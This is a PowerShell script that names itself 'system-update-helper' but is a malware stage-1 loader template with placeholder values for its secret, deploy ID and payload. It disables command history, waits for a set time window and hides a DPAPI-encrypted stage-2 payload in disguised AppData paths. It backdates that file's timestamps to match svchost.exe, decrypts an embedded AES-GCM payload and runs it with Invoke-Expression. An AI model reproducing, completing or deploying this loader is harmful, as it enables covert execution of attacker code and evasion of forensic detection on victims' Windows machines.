# system-update-helper v2.1.4
if ($PSVersionTable.PSVersion.Major -lt 7) { exit 1 }  # HIGH-2: requires PS7+ (AesGcm)
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.Security

# -- encoded configuration --
$_secret = 'STUB_SECRET'
$_f  = [System.Environment]::ExpandEnvironmentVariables('STUB_BLOB_PATH')
# Fallback blob paths tried in order if configured path is not writable
$_blob_tries = @(
    $_f,
    [System.Environment]::ExpandEnvironmentVariables('%APPDATA%\Microsoft\Windows\Themes\.ddb'),
    [System.Environment]::ExpandEnvironmentVariables('%APPDATA%\Microsoft\Windows\Recent\.ddb'),
    [System.Environment]::ExpandEnvironmentVariables('%LOCALAPPDATA%\Microsoft\Windows\History\.ddb')
) | Select-Object -Unique
$_ws  = 'STUB_WINDOW_START'
$_we  = 'STUB_WINDOW_END'
$_did = 'STUB_DEPLOY_ID'   # 16-char hex deploy fingerprint (sha256(pubkey)[:8])

# configuration data
$_p  = 'STUB_S2_PAYLOAD'

# -- debug (compile-time, set by wizard) --
STUB_DBG_INIT

# -- anti-forensic --
Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
[System.Environment]::SetEnvironmentVariable('HISTSIZE','0')

# -- time window check --
function _Tw {
    if ([string]::IsNullOrEmpty($_ws)) { return $true }
    $now = [int](Get-Date -Format 'HHmm')
    $s   = [int]($_ws -replace ':','')
    $e   = [int]($_we -replace ':','')
    if ($s -le $e) { return ($now -ge $s -and $now -le $e) }
    else           { return ($now -ge $s -or  $now -le $e) }
}

# -- dropbox helpers --
# -- AES-256-GCM decrypt for stub_secret-encrypted payload (HIGH-2: PS7+ / .NET 6+) --
function _AesDec($blob, $pass) {
    try {
        if (-not $blob.StartsWith('SGCM:')) { return $null }
        $raw   = [Convert]::FromBase64String($blob.Substring(5))
        $salt  = $raw[0..7]
        $nonce = $raw[8..19]
        $ctTag = $raw[20..($raw.Length - 1)]
        $kd    = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
                     $pass, $salt, 210000,
                     [System.Security.Cryptography.HashAlgorithmName]::SHA256)
        $key   = $kd.GetBytes(32)
        $gcm   = [System.Security.Cryptography.AesGcm]::new($key, 16)
        $pt    = [byte[]]::new($ctTag.Length - 16)
        $tag   = $ctTag[($ctTag.Length - 16)..($ctTag.Length - 1)]
        $gcm.Decrypt($nonce, $ctTag[0..($ctTag.Length - 17)], $tag, $pt, $null)
        return [System.Text.Encoding]::UTF8.GetString($pt)
    } catch { _dbg "AesDec error: $_"; return $null }
}

# -- timestomp blob to svchost.exe date (stable OS-install timestamp) --
function _Ts {
    try {
        $fi  = [System.IO.FileInfo]$_f
        $ref = Get-Item "$env:WINDIR\System32\svchost.exe" -ErrorAction SilentlyContinue
        if (-not $ref) {
            $dir = $fi.DirectoryName
            $ref = Get-ChildItem $dir -File -ErrorAction SilentlyContinue |
                   Where-Object { $_.FullName -ne $_f } |
                   Sort-Object LastWriteTime | Select-Object -First 1
        }
        if ($ref) {
            $fi.CreationTime   = $ref.CreationTime
            $fi.LastWriteTime  = $ref.LastWriteTime
            $fi.LastAccessTime = $ref.LastAccessTime
        }
    } catch {}
}

# -- execute stage2 --
function _Exec($code) {
    if ($PSCommandPath) { $env:_STUB_PATH = $PSCommandPath }
    Invoke-Expression $code
}

# ---- MAIN ----

_dbg "stub start"
_dbg "payload len: $($_p.Length)"
_dbg "blob path: $_f"

while (-not (_Tw)) { _dbg "outside time window, sleeping"; Start-Sleep 300 }

# ---- path 0: local hw-encrypted blob (ddb-first) ----
_dbg "checking local blob"
foreach ($_bt in $_blob_tries) {
    if (Test-Path $_bt) {
        try {
            $enc   = [System.IO.File]::ReadAllBytes($_bt)
            $plain = [System.Security.Cryptography.ProtectedData]::Unprotect(
                         $enc, $null, 'CurrentUser')
            if ($plain.Length -lt 17 -or
                [Text.Encoding]::UTF8.GetString($plain[0..15]) -ne $_did) {
                _dbg "deploy ID mismatch ($_bt), skipping"
                continue
            }
            $code = [Text.Encoding]::UTF8.GetString([byte[]]$plain[17..($plain.Length - 1)])
            $env:_BLOB_PATH = $_bt
            _dbg "DPAPI ok, executing (from blob: $_bt)"
            _Exec $code
            exit 0
        } catch { _dbg "DPAPI failed ($_bt): $_" }
    }
}

# ---- path 1: decrypt baked payload with stub_secret ----
_dbg "blob miss — decrypting baked payload with stub_secret"
$_raw = _AesDec $_p $_secret
if ($_raw -and $_raw.StartsWith('STRATUM:')) {
    $_s2 = $_raw.Substring(8)
    _dbg "magic ok, s2 len=$($_s2.Length)"
    Remove-Variable _raw -ErrorAction SilentlyContinue
    # cache blob — try each path until one succeeds
    $plain     = [Text.Encoding]::UTF8.GetBytes("$_did`n" + $_s2)
    $protected = [System.Security.Cryptography.ProtectedData]::Protect(
                     $plain, $null, 'CurrentUser')
    $env:_BLOB_TRIED = $_f
    $_saved = $false
    foreach ($_bt in $_blob_tries) {
        try {
            $bdir = Split-Path $_bt
            if (-not (Test-Path $bdir)) { New-Item -ItemType Directory -Path $bdir -Force -ErrorAction Stop | Out-Null }
            if (Test-Path $_bt) { try { (Get-Item $_bt -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {} }
            [System.IO.File]::WriteAllBytes($_bt, $protected)
            (Get-Item $_bt -Force -ErrorAction SilentlyContinue).Attributes = 'Hidden'
            $_f = $_bt
            $env:_BLOB_PATH = $_bt
            _Ts
            _dbg "blob saved: $_bt"
            $_saved = $true
            break
        } catch { _dbg "blob write failed ($_bt): $_" }
    }
    if (-not $_saved) { _dbg "blob save failed on all paths (non-fatal)" }
    _dbg "executing stage2 (from baked payload)"
    _Exec $_s2
    exit 0
} else { _dbg "decryption failed or bad magic" }

_dbg "no agent available : exit 1"
exit 1
